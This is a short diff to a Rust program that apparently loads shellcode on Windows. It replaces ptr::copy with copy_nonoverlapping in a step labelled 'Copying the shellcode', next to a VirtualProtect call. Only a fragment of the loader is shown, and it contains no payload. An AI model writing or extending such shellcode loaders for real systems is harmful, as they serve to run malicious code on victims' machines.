@@ -1,6 +1,6 @@
 use std::{
     mem::size_of,
-    ptr::{copy, null},
+    ptr::{copy_nonoverlapping, null},
 };
 use windows::Win32::System::{
     Diagnostics::{
@@ -94,7 +94,7 @@ fn main() -> Result<(), String>{
         );
 
         println!("[+] Copying the shellcode");
-        copy(shellcode.as_ptr() as _, address, shellcode.len());
+        copy_nonoverlapping(shellcode.as_ptr() as _, address, shellcode.len());
 
         let mut oldprotect = PAGE_PROTECTION_FLAGS(0);
         VirtualProtect(
